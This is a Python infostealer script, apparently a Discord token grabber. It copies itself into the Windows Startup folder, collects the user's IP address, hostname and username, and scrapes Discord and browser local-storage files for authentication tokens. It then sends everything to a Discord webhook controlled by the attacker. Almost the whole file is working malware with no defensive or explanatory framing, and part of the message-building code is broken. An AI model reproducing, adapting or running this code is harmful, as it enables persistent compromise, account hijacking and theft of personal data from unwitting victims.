import requests
import socket
import os
import re
import json
import shutil
import sys

ipAdd = requests.get('https://api.ipify.org').text

def copy_to_desktop():

    desktop_path = "C:\\Users\\Wout\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"

    current_script_path = os.path.abspath(sys.argv[0])

    destination_path = os.path.join(desktop_path, os.path.basename(current_script_path))

    shutil.copy2(current_script_path, destination_path)

if __name__ == "__main__":
    copy_to_desktop()
def get_username_os():
   return os.getenv("USERNAME")
# Replace 'YOUR_WEBHOOK_URL' with your Discord webhook URL
webhook_url = ""
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
username = get_username_os()
ip = ipAdd


def get_flag(ip):
	res = requests.get(f'https://geolocation-db.com/json/{ip}&position=true')
	country_code = res.json()['country_code'].lower()
	return f'https://ipdata.co/flags/{country_code}.png'
image_url = get_flag(ip)



response = requests.get(image_url)
image = response.content

files = {
    'payload_json': (None, '{"content": "their country:"}'),
    'media.png': image
    }

result = requests.post(webhook_url, files=files)
requests.post(webhook_url, {})

message = f"```name and ip:[{username}]:[{ip_address}]" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"" \                                                                                                                     GET DARTED" \
          f"" \
          f"" \
          f"" \
          f"" \
          f"!!!THIS FILE IS ADDED TO THE START UP OF THE PC!!!```"


import os
import re
import json



from urllib.request import Request, urlopen

WEBHOOK_URL = webhook_url


PING_ME = False

def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    message = '@everyone' if PING_ME else ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    payload = json.dumps({'content': message})

    try:
        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
        urlopen(req)
    except:
        pass

if __name__ == '__main__':
    main()



# Create a POST request to the webhook URL
payload = {"content": message}

response = requests.post(webhook_url, json=payload)

if response.status_code == 200:
    print("Message sent successfully.")
else:
    print("Failed to send message:", response.status_code)
